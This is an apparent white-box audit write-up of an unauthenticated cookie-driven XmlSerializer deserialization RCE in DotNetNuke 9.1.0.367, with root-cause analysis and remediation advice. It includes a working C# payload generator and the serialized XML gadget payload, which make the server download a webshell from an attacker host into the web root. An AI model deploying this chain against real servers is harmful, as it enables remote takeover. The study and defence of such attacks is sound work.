This article documents a white-box audit of DotNetNuke / DNN 9.1.0.367. The vulnerable path starts from the `DNNPersonalization` Cookie and reaches XML deserialization during unauthenticated 404 handling. Because the server creates an `XmlSerializer` from an attacker-controlled `type` attribute, the chain can use `ObjectDataProvider` and `ExpandedWrapper` to call `FileSystemUtils.PullFile()`, write a WebShell, and obtain RCE.


# Vulnerability Overview

- Product: DotNetNuke / DNN 9.1.0.367
- Vulnerability type: .NET `XmlSerializer` deserialization RCE
- Entry URL: any non-existent page / 404 page
- Controllable parameter: `Cookie: DNNPersonalization`
- Authentication requirement: unauthenticated
- Trigger location: `PersonalizationController.LoadProfile()`
- Final impact: deserialize `ObjectDataProvider`, invoke `FileSystemUtils.PullFile()`, write a WebShell, and reach RCE


# Audit Entry Point

Use `dnSpy` to decompile and debug the target assemblies. The first step is to locate an entry point that consumes external input.

## Locating the Cookie Entry

Search for `DNNPersonalization`. This leads to logic under `DotNetNuke.Services.Personalization`. Following the call sites reveals the target `LoadProfile()` function inside the `DotNetNuke.Services.Personalization.PersonalizationController` namespace.

![[Pasted image 20260524114105.png]]

![[Pasted image 20260524114116.png]]

The key code is shown below:

```csharp
HttpContext httpContext = HttpContext.Current;

if (httpContext != null && httpContext.Request.Cookies["DNNPersonalization"] != null)
{
    text = httpContext.Request.Cookies["DNNPersonalization"].Value;
}

personalizationInfo.Profile =
    string.IsNullOrEmpty(text) ? new Hashtable() : Globals.DeserializeHashTableXml(text);
```

This confirms that an attacker can control the value of `text` through the `DNNPersonalization` Cookie. That value is then passed into `DeserializeHashTableXml()`.

## Deserialization Call Chain

```text
HTTP Request
  ↓
Cookie: DNNPersonalization
  ↓
LoadProfile()
  ↓
Globals.DeserializeHashTableXml()
  ↓
XmlUtils.DeSerializeHashtable()
  ↓
XmlDocument.LoadXml(xmlSource)
  ↓
SelectNodes("profile/item")
  ↓
Read the type attribute from item
  ↓
Type.GetType(type)
  ↓
new XmlSerializer(type)
  ↓
Deserialize(xmlReader)
```


# Root Cause

## Dangerous Function

The core function is `DeSerializeHashtable()`:

```csharp
public static Hashtable DeSerializeHashtable(string xmlSource, string rootname)
{
    Hashtable hashtable = new Hashtable();

    if (!string.IsNullOrEmpty(xmlSource))
    {
        try
        {
            XmlDocument xmlDocument = new XmlDocument();
            xmlDocument.LoadXml(xmlSource);

            foreach (object obj in xmlDocument.SelectNodes(rootname + "/item"))
            {
                XmlElement xmlElement = (XmlElement)obj;

                string attribute = xmlElement.GetAttribute("key");
                string attribute2 = xmlElement.GetAttribute("type");

                XmlSerializer xmlSerializer =
                    new XmlSerializer(Type.GetType(attribute2));

                XmlTextReader xmlReader =
                    new XmlTextReader(new StringReader(xmlElement.InnerXml));

                hashtable.Add(attribute, xmlSerializer.Deserialize(xmlReader));
            }
        }
        catch (Exception)
        {
        }
    }

    return hashtable;
}
```

The vulnerable behavior is concentrated in these two lines:

```csharp
XmlSerializer xmlSerializer = new XmlSerializer(Type.GetType(attribute2));
hashtable.Add(attribute, xmlSerializer.Deserialize(xmlReader));
```

The attacker controls both the XML body and the `type` attribute on each `item` node. The application then dynamically resolves that attacker-supplied type with `Type.GetType()` and passes it to `XmlSerializer.Deserialize()` without a type allowlist.

## Why This Can Lead to Code Execution

`XmlSerializer` does not directly execute commands. The risk comes from object construction and public property assignment during deserialization. Some classes execute additional logic from property setters. If that logic can indirectly invoke a method, the deserialization flow can become an RCE chain.


# Exploitation Conditions

The full chain requires these conditions:

1. The target DNN version contains this deserialization logic.
2. An unauthenticated request can trigger `LoadProfile()`.
3. The `DNNPersonalization` Cookie is attacker-controlled.
4. The target environment contains a gadget type that `XmlSerializer` can process.
5. The target Web directory, or another useful path, is writable.
6. The target server can reach an attacker-controlled HTTP service.


# Exploitation Path

## Stage 1: Confirm the Cookie Reaches Deserialization

After visiting the target home page, the server shows a new IIS Worker Process named `w3wp.exe`.

![[Pasted image 20260524220109.png]]

Attach `dnSpy` to the matching process and set a breakpoint on the Cookie check.

![[Pasted image 20260524220518.png]]

Use Burp to send an unauthenticated request to a non-existent page while carrying a test `DNNPersonalization` Cookie.

![[Pasted image 20260524220540.png]]

Why use a non-existent page? In this DNN flow, 404 handling is the easiest unauthenticated path to `LoadProfile()`. The rough sequence is: send a request, trigger a 404, enter `AdvancedUrlReWriter.Handle404OrException()`, access `PortalSettings.UserMode`, call `Personalization.GetProfile()`, and finally reach `LoadProfile()`.

If the path is correct, the request triggers the breakpoint in `dnSpy`.

![[Pasted image 20260524220550.png]]

This proves that requests to non-existent pages can enter the personalization loading flow.

## Stage 2: Find a Useful Target Type

In DotNetNuke, a practical target method is `DotNetNuke.Common.Utilities.FileSystemUtils.PullFile()`. This method downloads a file from a remote URL and writes it to a local path.

The ideal attack flow is:

```text
Download an ASPX WebShell from the attacker server
  ↓
Write it into the DNN Web root
  ↓
Request the WebShell
  ↓
Obtain RCE
```

The limitation is that `XmlSerializer` handles public properties and fields; it does not directly call arbitrary methods. So we cannot simply deserialize `FileSystemUtils` and directly invoke `PullFile()`.

## Stage 3: Use ObjectDataProvider as the Invocation Bridge

`System.Windows.Data.ObjectDataProvider` can be used as the bridge. It can invoke a method through property configuration:

- `MethodName` specifies the method to call.
- `MethodParameters` supplies the method arguments.

The important properties are:

```text
ObjectInstance      → Wrapped object
MethodName          → Method to call
MethodParameters    → Method arguments
```

Example structure:

```text
ObjectInstance = new FileSystemUtils()
MethodName = "PullFile"
MethodParameters[0] = "http://attacker/cmdasp.aspx"
MethodParameters[1] = "C:/inetpub/wwwroot/dotnetnuke/cmdasp.aspx"
```

## Stage 4: Solve Direct ObjectDataProvider Serialization Failure

There is still a type discovery problem. The `XmlSerializer` instance is created from the result of `GetType()` on the provided object. If the payload directly supplies an `ObjectDataProvider`, the serializer only sees `ObjectDataProvider`; it does not understand the `FileSystemUtils` instance wrapped inside it.

The workaround is `System.Data.Services.Internal.ExpandedWrapper<T0, T1>`. It writes the relationship between `FileSystemUtils` and `ObjectDataProvider` into the outer generic type, allowing `XmlSerializer` to understand the full type graph.

The final structure is:

```text
ExpandedWrapper<FileSystemUtils, ObjectDataProvider>
```


# Payload Construction

## Payload Generator

```csharp
using System;
using System.IO;
using DotNetNuke.Common.Utilities;
using DotNetNuke.Common;
using System.Collections;
using System.Data.Services.Internal;
using System.Windows.Data;

namespace ExpWrapSerializer
{
    class Program
    {
        static void Main(string[] args)
        {
            Serialize();
        }

        public static void Serialize()
        {
            ExpandedWrapper<FileSystemUtils, ObjectDataProvider> myExpWrap =
                new ExpandedWrapper<FileSystemUtils, ObjectDataProvider>();

            myExpWrap.ProjectedProperty0 = new ObjectDataProvider();

            myExpWrap.ProjectedProperty0.ObjectInstance =
                new FileSystemUtils();

            myExpWrap.ProjectedProperty0.MethodName =
                "PullFile";

            myExpWrap.ProjectedProperty0.MethodParameters.Add(
                "http://ATTACKER-IP/cmdasp.aspx"
            );

            myExpWrap.ProjectedProperty0.MethodParameters.Add(
                "C:/inetpub/wwwroot/dotnetnuke/cmdasp.aspx"
            );

            Hashtable table = new Hashtable();
            table["myTableEntry"] = myExpWrap;

            string payload = XmlUtils.SerializeDictionary(table, "profile");

            TextWriter writer =
                new StreamWriter("C:\\Users\\Public\\ExpWrap.txt");

            writer.Write(payload);
            writer.Close();

            Console.WriteLine("Done!");
        }
    }
}
```

## Generated XML Structure

The resulting XML has this general shape:

```xml
<profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://192.168.119.120/myODPTest.txt</anyType><anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
```

Inside the serialized object structure, the `profile` node contains an `item` node. Its `type` attribute is no longer a plain `ObjectDataProvider`; it contains the full type information for `ExpandedWrapper`, `FileSystemUtils`, and `ObjectDataProvider`. This allows the serializer to identify the actual wrapped object type.


# Final Exploit Chain

```text
Prepare an ASPX WebShell
  ↓
Start an attacker-controlled HTTP service
  ↓
Generate the DNNPersonalization XML payload
  ↓
Place the payload in the Cookie
  ↓
Request a non-existent target page
  ↓
Trigger DNN 404 handling
  ↓
Enter LoadProfile()
  ↓
Read the DNNPersonalization Cookie
  ↓
DeserializeHashTableXml()
  ↓
DeSerializeHashtable()
  ↓
Type.GetType(type)
  ↓
XmlSerializer.Deserialize()
  ↓
Deserialize ExpandedWrapper
  ↓
Set ObjectDataProvider properties
  ↓
ObjectDataProvider calls PullFile()
  ↓
Target downloads cmdasp.aspx from the attacker server
  ↓
Write into the DNN Web root
  ↓
Request cmdasp.aspx
  ↓
RCE / Reverse Shell
```


# Remediation

## Prevent User-Controlled Deserialization Types

Do not construct deserialization types from user input:

```csharp
new XmlSerializer(Type.GetType(userInput))
```

This is especially risky when the input comes from Cookies, request parameters, or any other external source.

## Use a Type Allowlist

Only allow fixed and expected types to be deserialized:

```csharp
allowedTypes = {
    typeof(string),
    typeof(int),
    typeof(UserPreference)
}
```

Do not deserialize arbitrary assembly types.

## Do Not Store Complex Objects in Cookies

Cookies should only store simple state:

```text
Session ID
Simple preference ID
Language setting
Short token
```

They should not store:

```text
Serializable objects
Full XML objects
Object structures with type metadata
```

## Reduce Application Pool Privileges

Even if deserialization is triggered, the impact should be constrained:

```text
IIS AppPool should not have arbitrary write access to the Web root
Block writes into executable script directories
Restrict outbound HTTP requests
Restrict PowerShell / cmd execution permissions
```

## Upgrade and Recheck

Upgrade to the official fixed version, then verify that the following patterns are not still present:

```text
DNNPersonalization Cookie deserialization
Type.GetType()
XmlSerializer.Deserialize()
ObjectDataProvider gadget
ExpandedWrapper gadget
```
